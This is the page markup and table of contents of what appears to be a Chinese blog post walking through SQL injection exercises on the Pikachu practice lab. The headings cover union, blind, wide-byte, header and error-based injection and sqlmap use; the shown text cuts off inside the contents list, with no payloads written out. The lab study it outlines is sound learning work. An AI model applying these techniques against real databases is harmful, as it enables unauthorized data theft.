<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="sql注入">
<meta property="og:type" content="article">
<meta property="og:title" content="pikachu靶场系列-sql注入">
<meta property="og:url" content="http://example.com/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/sql%E6%B3%A8%E5%85%A5/index.html">
<meta property="og:site_name" content="欢 迎 光 临">
<meta property="og:description" content="sql注入">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109105642791.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109111315150.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109111347975.png">
<meta property="og:image" content="http://example.com/images/image-20230109111919855.png">
<meta property="og:image" content="http://example.com/images/image-20230109112009321.png">
<meta property="og:image" content="http://example.com/images/image-20230109112302345.png">
<meta property="og:image" content="http://example.com/images/image-20230109112352909.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109112828312.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109113000341.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109113022537.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109113152391.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109135947865.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109134842484.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109135325713.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109135737806.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109140324209.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109140614225.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109141141373.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109141451060.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109141715448.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109141832527.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109141926918.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109142034486.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109142253366.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109142507119.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109142618699.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109143133507.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109143215156.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109143432513.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109143512248.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109143547949.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109143631888.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109143915692.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109150223050.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109150610816.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109150722802.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109144137831.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109144913575.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109145416985.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109145442722.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109150021856.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109230812814.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109231026283.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109231106364.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109231226177.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109233012407.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109233600397.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109233713229.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230110084215643.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230110085004995.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230110085453488.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109234433676.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109234546270.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109234741138.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109234818055.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109235411194.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230110000502120.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230110000702020.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230110000156970.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230110001003872.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230110001714570.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230110091916345.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230110092955693.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230110093225671.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230110093329224.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230110093413618.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230110093512717.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230110093825765.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230110094054457.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230110095012638.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109155137082.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109155523640.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109160329164.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109155950514.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109160149638.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109160306652.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109161907927.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109162133611.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109162031881.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109162542325.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109164120043.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109165251841.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230224093155425.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230224094415861.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109224454398.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109224541248.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109224846408.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109225205208.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109151523594.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109151801590.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109151855923.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109153408606.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109153447170.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109171528855.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109220259851.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109201349029.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109201644077.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109201838975.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109210800957.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109210927245.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109213909438.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109213937383.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109222211826.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109222929316.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109223022020.png">
<meta property="og:image" content="http://example.com/images%5Cimage-20230109224038685.png">
<meta property="article:published_time" content="2023-05-04T03:14:24.289Z">
<meta property="article:modified_time" content="2023-05-04T13:24:44.387Z">
<meta property="article:author" content="fn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images%5Cimage-20230109105642791.png">


<link rel="canonical" href="http://example.com/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/sql%E6%B3%A8%E5%85%A5/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/sql%E6%B3%A8%E5%85%A5/","path":"2023/05/04/pikachu靶场系列/sql注入/","title":"pikachu靶场系列-sql注入"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>pikachu靶场系列-sql注入 | 欢 迎 光 临</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">欢 迎 光 临</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">sql注入概述</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E5%A6%82"><span class="nav-number">1.0.1.</span> <span class="nav-text">例如</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5-POST"><span class="nav-number">2.</span> <span class="nav-text">数字型注入(POST)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8C%9C%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="nav-number">2.0.1.</span> <span class="nav-text">猜字段数</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#order-by"><span class="nav-number">2.0.1.0.1.</span> <span class="nav-text">order by</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="nav-number">2.0.2.</span> <span class="nav-text">查询数据库名</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#union"><span class="nav-number">2.0.2.0.1.</span> <span class="nav-text">union</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E8%A1%A8%E5%90%8D"><span class="nav-number">2.0.3.</span> <span class="nav-text">查询表名</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#information-schema"><span class="nav-number">2.0.3.0.1.</span> <span class="nav-text">information_schema</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#group-concat"><span class="nav-number">2.0.3.0.2.</span> <span class="nav-text">group_concat()</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="nav-number">2.0.4.</span> <span class="nav-text">查询字段名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96%E5%AD%97%E6%AE%B5%E7%9A%84%E5%80%BC"><span class="nav-number">2.0.5.</span> <span class="nav-text">读取字段的值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlmap"><span class="nav-number">2.0.6.</span> <span class="nav-text">sqlmap</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BE%93%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF"><span class="nav-number">2.0.6.0.1.</span> <span class="nav-text">输出数据库相关信息</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BE%93%E5%87%BApikachu%E7%9A%84%E8%A1%A8"><span class="nav-number">2.0.6.0.2.</span> <span class="nav-text">输出pikachu的表</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BE%93%E5%87%BApikachu-users%E7%9A%84%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="nav-number">2.0.6.0.3.</span> <span class="nav-text">输出pikachu.users的字段名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BE%93%E5%87%BApikachu-users-users%E7%9A%84%E5%AD%97%E6%AE%B5%E5%80%BC"><span class="nav-number">2.0.6.0.4.</span> <span class="nav-text">输出pikachu.users.users的字段值</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BF%9B%E5%85%A5sql-shell"><span class="nav-number">2.0.6.0.5.</span> <span class="nav-text">进入sql shell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%88%96"><span class="nav-number">2.0.6.0.6.</span> <span class="nav-text">或</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5-GET"><span class="nav-number">3.</span> <span class="nav-text">字符型注入(GET)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="nav-number">3.0.1.</span> <span class="nav-text">查字段数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-1"><span class="nav-number">3.0.2.</span> <span class="nav-text">查询数据库名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E8%A1%A8%E5%90%8D-1"><span class="nav-number">3.0.3.</span> <span class="nav-text">查询表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E5%AD%97%E6%AE%B5%E5%90%8D-1"><span class="nav-number">3.0.4.</span> <span class="nav-text">查询字段名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E5%AD%97%E6%AE%B5%E5%80%BC"><span class="nav-number">3.0.5.</span> <span class="nav-text">查询字段值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlmap-1"><span class="nav-number">3.0.6.</span> <span class="nav-text">sqlmap</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XX%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">4.</span> <span class="nav-text">XX型注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload"><span class="nav-number">4.0.1.</span> <span class="nav-text">payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlmap-2"><span class="nav-number">4.0.2.</span> <span class="nav-text">sqlmap</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">5.</span> <span class="nav-text">搜索型注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-1"><span class="nav-number">5.0.1.</span> <span class="nav-text">payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlmap-3"><span class="nav-number">5.0.2.</span> <span class="nav-text">sqlmap</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#http%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="nav-number">6.</span> <span class="nav-text">http头注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#payload-2"><span class="nav-number">6.1.</span> <span class="nav-text">payload</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">6.1.0.0.1.</span> <span class="nav-text">获取数据库</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%80%BC"><span class="nav-number">6.1.0.0.2.</span> <span class="nav-text">获取字段值</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlmap-4"><span class="nav-number">6.2.</span> <span class="nav-text">sqlmap</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="nav-number">7.</span> <span class="nav-text">基于时间的盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#payload-3"><span class="nav-number">7.1.</span> <span class="nav-text">payload</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#mysql-if"><span class="nav-number">7.1.0.1.</span> <span class="nav-text">mysql if</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8C%9C%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E9%95%BF%E5%BA%A6"><span class="nav-number">7.1.0.2.</span> <span class="nav-text">猜数据库名长度</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8C%9C%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="nav-number">7.1.0.3.</span> <span class="nav-text">猜数据库名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8C%9C%E8%A1%A8%E4%BF%A1%E6%81%AF"><span class="nav-number">7.1.0.4.</span> <span class="nav-text">猜表信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8C%9C%E5%AD%97%E6%AE%B5%E4%BF%A1%E6%81%AF"><span class="nav-number">7.1.0.5.</span> <span class="nav-text">猜字段信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8C%9C%E5%AD%97%E6%AE%B5%E5%80%BC"><span class="nav-number">7.1.0.6.</span> <span class="nav-text">猜字段值</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlmap-5"><span class="nav-number">7.2.</span> <span class="nav-text">sqlmap</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8Eboolian%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="nav-number">8.</span> <span class="nav-text">基于boolian的盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#payload-4"><span class="nav-number">8.1.</span> <span class="nav-text">payload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8C%9C%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E9%95%BF%E5%BA%A6-1"><span class="nav-number">8.1.1.</span> <span class="nav-text">猜数据库名长度</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8C%9C%E6%95%B0%E6%8D%AE%E5%BA%93%E5%80%BC"><span class="nav-number">8.1.2.</span> <span class="nav-text">猜数据库值</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ASCII"><span class="nav-number">8.1.2.0.1.</span> <span class="nav-text">ASCII()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#substr"><span class="nav-number">8.1.2.0.2.</span> <span class="nav-text">substr()</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8C%9C%E6%95%B0%E6%8D%AE%E8%A1%A8%E4%B8%AA%E6%95%B0"><span class="nav-number">8.1.3.</span> <span class="nav-text">猜数据表个数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8C%9C%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%90%8D%E9%95%BF%E5%BA%A6"><span class="nav-number">8.1.4.</span> <span class="nav-text">猜数据表名长度</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8C%9C%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%90%8D"><span class="nav-number">8.1.5.</span> <span class="nav-text">猜数据表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8C%9C%E5%AD%97%E6%AE%B5%E4%B8%AA%E6%95%B0"><span class="nav-number">8.1.6.</span> <span class="nav-text">猜字段个数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8C%9C%E5%AD%97%E6%AE%B5%E5%90%8D%E9%95%BF%E5%BA%A6"><span class="nav-number">8.1.7.</span> <span class="nav-text">猜字段名长度</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8C%9C%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="nav-number">8.1.8.</span> <span class="nav-text">猜字段名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8C%9C%E5%AD%97%E6%AE%B5%E5%86%85%E5%AE%B9%E4%B8%AA%E6%95%B0"><span class="nav-number">8.1.9.</span> <span class="nav-text">猜字段内容个数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8C%9C%E5%AD%97%E6%AE%B5%E5%86%85%E5%AE%B9%E9%95%BF%E5%BA%A6"><span class="nav-number">8.1.10.</span> <span class="nav-text">猜字段内容长度</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8C%9C%E5%AD%97%E6%AE%B5%E5%86%85%E5%AE%B9"><span class="nav-number">8.1.11.</span> <span class="nav-text">猜字段内容</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlmap-6"><span class="nav-number">8.2.</span> <span class="nav-text">sqlmap</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-number">9.</span> <span class="nav-text">宽字节注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">9.1.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">9.1.0.1.</span> <span class="nav-text">参考</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%AD%94%E6%9C%AF%E5%BC%95%E5%8F%B7"><span class="nav-number">9.1.0.2.</span> <span class="nav-text">魔术引号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GBK%E7%BC%96%E7%A0%81"><span class="nav-number">9.1.0.3.</span> <span class="nav-text">GBK编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86"><span class="nav-number">9.1.0.4.</span> <span class="nav-text">宽字节SQL注入的原理</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload-5"><span class="nav-number">9.2.</span> <span class="nav-text">payload</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">9.2.0.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="nav-number">9.2.0.2.</span> <span class="nav-text">判断字段数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93-1"><span class="nav-number">9.2.0.3.</span> <span class="nav-text">获取数据库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D"><span class="nav-number">9.2.0.4.</span> <span class="nav-text">获取表名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="nav-number">9.2.0.5.</span> <span class="nav-text">获取字段名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%80%BC-1"><span class="nav-number">9.2.0.6.</span> <span class="nav-text">获取字段值</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlmap-7"><span class="nav-number">9.3.</span> <span class="nav-text">sqlmap</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">10.</span> <span class="nav-text">报错注入前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#xpath%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">10.0.1.</span> <span class="nav-text">xpath报错注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#updatexml"><span class="nav-number">10.0.2.</span> <span class="nav-text">updatexml()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#extractvalue"><span class="nav-number">10.0.3.</span> <span class="nav-text">extractvalue()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#floor"><span class="nav-number">10.0.4.</span> <span class="nav-text">floor()</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#rand"><span class="nav-number">10.0.4.0.1.</span> <span class="nav-text">rand()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#count"><span class="nav-number">10.0.4.0.2.</span> <span class="nav-text">count(*)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#group-by"><span class="nav-number">10.0.4.0.3.</span> <span class="nav-text">group by</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" 